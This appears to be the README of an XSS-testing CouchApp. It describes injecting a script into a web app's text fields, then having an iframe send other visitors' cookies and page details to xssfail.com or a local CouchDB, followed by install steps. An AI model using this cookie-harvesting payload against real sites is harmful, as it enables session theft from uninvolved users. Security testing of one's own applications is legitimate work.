## Who is this project for?

If you know about [xss(Cross-site scripting)](http://en.wikipedia.org/wiki/Cross-site_scripting) vulnerability, and want to check whether you web app is secure enough, this project is for YOU!
There are 2 options:
1. Install standalone app to avoid losing sensitive data.
2. Use online app - [xssFail.com](http://xssfail.com)

## How does it work?

1. You inject script: <script src="..."></script>
into target text field and save it. Any text field could be used (Product name, User name, Login, Address etc.). Let's say you use "Product" field.
2. UserA opens page with list of products with product you've injected.
3. If html engine doesn't encode strings UserA will get javascript executed.
4. Injected javascript code writes (document.write) the following tag:
    <iframe src="http://xssfail.com/form?param1=&param2=&paramN=" />
where param1, param2, paramN - all information about UserA (including browser cookies, site url etc.)
5. After iframe is loaded it executes script which saves info from URL (param1, param2, param3) into CouchDb database.
6. You can go to xssfail.com and search for "WINNERS".

## How to install standalone app?

### Before you start

Before you start using this app, it's necessary to:
1. [Install CouchDB](http://wiki.apache.org/couchdb/Installation) v.1.1.x or greater. More info about couchDB [here](http://wiki.apache.org/couchdb/).
2. [Install CouchApp](http://couchapp.org/page/installing). More info about couchApp [here](http://couchapp.org/page/index).

CouchApps are web applications which can be served directly from [CouchDB](http://couchdb.apache.org).
This gives them the nice property of replicating just like any other data stored in CouchDB.
They are also simple to write as they can use the built-in jQuery libraries and plugins that ship with CouchDB.

### Deploying this app

Assuming you just cloned this app from git,
and you have changed into the app directory in your terminal, you want to push it to your CouchDB with the CouchApp command line tool, like this:

    couchapp push . http://name:password@localhost:5984/xss

If you don't have a password on your CouchDB (admin party) you can do it like this (but it's a bad, idea, set a password):

    couchapp push . http://localhost:5984/xss

If you get sick of typing the URL, you should setup a `.couchapprc` file in the root of your directory.
Remember not to check this into version control as it could have passwords in it.

The `.couchapprc` file should have contents like this:

    {
        "default" : {
          "db" : "http://localhost:5984/xss"
        }
      }
    }

Now that you have the `.couchapprc` file set up, you can push your app to the CouchDB as simply as:

    couchapp push

This pushes to the `default` as specified.

go to [http://localhost:5984/xss/_design/api/_views/index](http://localhost:5984/xss/_design/api/_views/index) to open default UI page
go to [http://localhost:5984/_utils](http://localhost:5984/_utils) to open database UI manager - [http://wiki.apache.org/couchdb/Getting_started_with_Futon](Futon)

